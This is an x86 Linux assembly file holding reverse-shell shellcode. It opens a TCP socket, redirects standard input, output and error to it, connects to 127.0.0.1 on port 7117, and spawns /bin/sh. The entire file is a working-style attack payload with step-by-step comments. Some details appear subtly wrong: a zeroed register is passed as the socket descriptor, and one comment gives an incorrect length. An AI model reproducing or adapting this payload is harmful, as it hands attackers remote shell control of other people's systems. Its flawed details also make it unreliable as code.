global _start
section .text

_start:

socket:	
	xor eax, eax
	mul ebx
	mul esi			;null registers
	
	mov al, 0x66		;socket syscall
	mov bl, 0x1		;1 => socket
	push 0x6		;protocol = ipproto_tcp = 6
	push 0x1		;type = sock_stream = 1
	push 0x2		;domain = af_inet = 2
	mov ecx, esp		;args
	int 0x80		;syscall
	mov ebx, eax 		;return fd

	xor ecx, ecx
	mov cl, 0x2		;std input counter
dup2:
	mov al, 0x3f		;dup2 syscall
	int 0x80		;syscall
	dec ecx			;next std input
	jns dup2		;loop
	
connect:	
	mov al, 0x66		;socket syscall
	mov bl, 0x3		;3 => connect
	push 0x0100007f		;address = 127.0.0.1
	push word 0xcd1b	;port = 7117
	push word 0x2		;domain = af_inet = 2
	mov ecx, esp		;*addr = esp
	push byte 0x10		;addrlen = 10
	push ecx		;*addr
	push edx		;fd
	mov ecx, esp		;args
	int 0x80		;syscall

execve:
	mov al, 0xb		;execve syscall
	push si			;envp = null
	push 0x68732f2f		;hs//
	push 0x6e69622f		;nib/
	mov ebx, esp		;*filename = esp
	push esi		;filename = "/bin/sh", 0x00000000
	mov edx, esp		;envp = null
	push ebx		;argv = *filename
	mov ecx, esp		;argv = **filename
	int 0x80		;syscall
